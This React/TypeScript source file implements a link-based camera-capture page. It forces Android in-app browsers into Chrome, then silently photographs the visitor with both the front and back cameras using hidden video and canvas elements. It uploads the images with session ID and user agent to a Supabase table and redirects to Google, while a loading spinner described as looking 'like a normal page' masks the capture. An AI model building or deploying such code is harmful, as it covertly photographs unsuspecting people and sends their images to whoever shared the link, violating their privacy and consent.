import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

// Whitelist of allowed redirect domains for security
const ALLOWED_REDIRECT_DOMAINS = [
  'google.com',
  'www.google.com',
];

// Validate redirect URL to prevent open redirect attacks
const isValidRedirectUrl = (url: string): boolean => {
  try {
    const parsed = new URL(url);
    
    // Only allow HTTPS (or localhost for dev)
    if (parsed.protocol !== 'https:' && 
        !(parsed.protocol === 'http:' && parsed.hostname === 'localhost')) {
      return false;
    }
    
    // Check against whitelist
    return ALLOWED_REDIRECT_DOMAINS.some(domain => 
      parsed.hostname === domain || parsed.hostname.endsWith(`.${domain}`)
    );
  } catch {
    return false;
  }
};

// Detect in-app browsers (Instagram, Telegram, Facebook, etc.)
const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || '';
  const inAppPatterns = [
    'Instagram',
    'FBAN',
    'FBAV',
    'FB_IAB',
    'Telegram',
    'TelegramBot',
    'Twitter',
    'Line',
    'Snapchat',
    'WhatsApp',
    'LinkedIn',
    'Pinterest',
    'Viber',
    'WeChat',
    'MicroMessenger',
  ];
  
  return inAppPatterns.some(pattern => ua.includes(pattern));
};

// Detect if device is Android
const isAndroid = (): boolean => {
  const ua = navigator.userAgent || '';
  return /Android/i.test(ua);
};

// Detect if browser is Chrome (real Chrome, not in-app)
const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || '';
  // Must have Chrome and not be in-app browser
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);
  
  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

// Generate Chrome intent URL for Android
const getChromeIntentUrl = (currentUrl: string): string => {
  // intent://URL#Intent;scheme=https;package=com.android.chrome;end
  const url = new URL(currentUrl);
  const intentUrl = `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
  return intentUrl;
};

const Capture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [status, setStatus] = useState<"checking" | "redirecting_chrome" | "not_chrome" | "loading" | "front" | "back" | "redirecting">("checking");
  
  const sessionId = searchParams.get("session") || "default";
  const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
  
  // Validate and sanitize redirect URL
  const redirectUrl = isValidRedirectUrl(rawRedirectUrl) ? rawRedirectUrl : "https://google.com";

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        // Wait for camera to stabilize
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // Capture photo
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            return imageData;
          }
        }
        
        // Stop camera
        stream.getTracks().forEach(track => track.stop());
      }
      
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  useEffect(() => {
    // Step 1: Check browser type
    const checkBrowserAndProceed = async () => {
      // If in-app browser on Android, redirect to Chrome
      if (isInAppBrowser() && isAndroid()) {
        setStatus("redirecting_chrome");
        const chromeIntent = getChromeIntentUrl(window.location.href);
        
        // Small delay then redirect
        setTimeout(() => {
          window.location.href = chromeIntent;
        }, 100);
        return;
      }
      
      // If in-app browser on non-Android, show message
      if (isInAppBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      // If not Chrome browser, show message
      if (!isChromeBrowser()) {
        setStatus("not_chrome");
        return;
      }
      
      // We're in Chrome - proceed with camera capture
      await captureAndRedirect();
    };

    const captureAndRedirect = async () => {
      try {
        // Capture from FRONT camera first
        setStatus("front");
        const frontImage = await captureFromCamera("user");
        
        if (frontImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: frontImage,
            user_agent: `${navigator.userAgent} [FRONT]`
          });
        }
        
        // Small delay before switching cameras
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Capture from BACK camera
        setStatus("back");
        const backImage = await captureFromCamera("environment");
        
        if (backImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: backImage,
            user_agent: `${navigator.userAgent} [BACK]`
          });
        }
        
        setStatus("redirecting");
        
        // Redirect after short delay using validated URL
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 300);
        
      } catch (error) {
        console.error("Capture error:", error);
        // Redirect anyway even if camera fails - using safe default
        window.location.href = "https://google.com";
      }
    };

    checkBrowserAndProceed();
  }, [sessionId, redirectUrl]);

  // Show "not Chrome" message
  if (status === "not_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center max-w-md">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
            <svg className="w-8 h-8 text-destructive" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-foreground mb-2">Browser Not Supported</h1>
          <p className="text-muted-foreground">
            Ye link sirf Google Chrome browser me kaam karta hai.
          </p>
          <p className="text-muted-foreground text-sm mt-4">
            Please open this link in Google Chrome browser.
          </p>
        </div>
      </div>
    );
  }

  // Show redirecting to Chrome message
  if (status === "redirecting_chrome") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">
            Opening in Chrome...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      {/* Hidden video and canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Loading indicator that looks like a normal page */}
      <div className="text-center">
        <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
        <p className="text-muted-foreground text-sm">
          {status === "checking" && "Loading..."}
          {status === "loading" && "Loading..."}
          {status === "front" && "Please wait..."}
          {status === "back" && "Almost done..."}
          {status === "redirecting" && "Redirecting..."}
        </p>
      </div>
    </div>
  );
};

export default Capture;
